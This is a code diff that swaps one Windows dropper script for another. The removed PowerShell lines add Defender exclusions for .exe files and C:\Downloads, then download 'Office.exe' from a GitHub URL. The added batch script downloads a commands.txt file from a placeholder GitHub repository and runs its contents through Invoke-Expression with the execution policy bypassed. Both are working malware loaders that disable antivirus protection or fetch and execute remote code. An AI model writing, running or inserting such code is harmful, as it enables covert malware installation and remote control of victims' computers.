@@ -1,4 +1,21 @@
-# Exclude .exe files and download a file from GitHub
-Add-MpPreference -ExclusionExtension ".exe"
-Add-MpPreference -ExclusionPath "C:\Downloads"
-Invoke-WebRequest -Uri "https://github.com/Infra0202/s/raw/main/Office.exe" -OutFile "C:\Downloads\Office.exe"
+@echo off
+:: Define the Downloads directory based on the user's profile
+set "downloadsDir=%USERPROFILE%\Downloads"
+
+:: Ensure the Downloads directory exists
+if not exist "%downloadsDir%" (
+    mkdir "%downloadsDir%"
+)
+
+:: Download commands.txt from GitHub using PowerShell
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/YourUsername/YourRepo/main/commands.txt' -OutFile '%downloadsDir%\commands.txt'"
+
+:: Check if the download was successful
+if exist "%downloadsDir%\commands.txt" (
+    echo commands.txt downloaded successfully.
+
+    :: Read and execute commands from commands.txt
+    powershell -ExecutionPolicy Bypass -Command "& {Get-Content '%downloadsDir%\commands.txt' | Invoke-Expression}"
+) else (
+    echo Failed to download commands.txt
+)
